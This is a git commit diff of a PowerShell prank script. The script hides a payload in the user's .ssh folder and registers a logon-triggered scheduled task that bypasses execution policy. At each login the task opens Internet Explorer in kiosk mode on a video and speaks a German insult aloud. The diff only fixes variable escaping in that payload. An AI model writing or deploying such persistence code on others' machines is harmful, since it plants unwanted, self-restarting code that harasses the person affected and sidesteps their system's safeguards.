4e244b80147df9df3f8118214f445e391f081598
joshua.dm <43703193+joshuademarco@users.noreply.github.com>
2023-06-06 11:58:17 +0200

    Update execute.ps1
    fix

--- execute.ps1
+++ execute.ps1
@@ -2,7 +2,7 @@ $dir = "C:\\Users\\$env:USERNAME\\.ssh\script.ps1"
 
 unregister-scheduledtask -TaskName "Task2" -confirm:$false -ErrorAction SilentlyContinue
 
-Set-Content -Path $dir -Value "Start-Process iexplore -ArgumentList '-k https://player.vimeo.com/video/198392879?autoplay=1 -WindowStyle Maximized'; Add-Type -AssemblyName System.speech; $TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; \$TTS.Speak('Du bist eine Lusche. Viel spass beim video.'); Exit"
+Set-Content -Path $dir -Value "Start-Process iexplore -ArgumentList '-k https://player.vimeo.com/video/198392879?autoplay=1 -WindowStyle Maximized'; Add-Type -AssemblyName System.speech; `$TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; `$TTS.Speak('Du bist eine Lusche. Viel spass beim video.'); Exit"
 
 $Sta = New-ScheduledTaskAction 'PowerShell.exe' ('-noprofile -executionpolicy bypass -file ' + $dir)
 $Stt = New-ScheduledTaskTrigger -AtLogOn -User ($env:USERNAME)
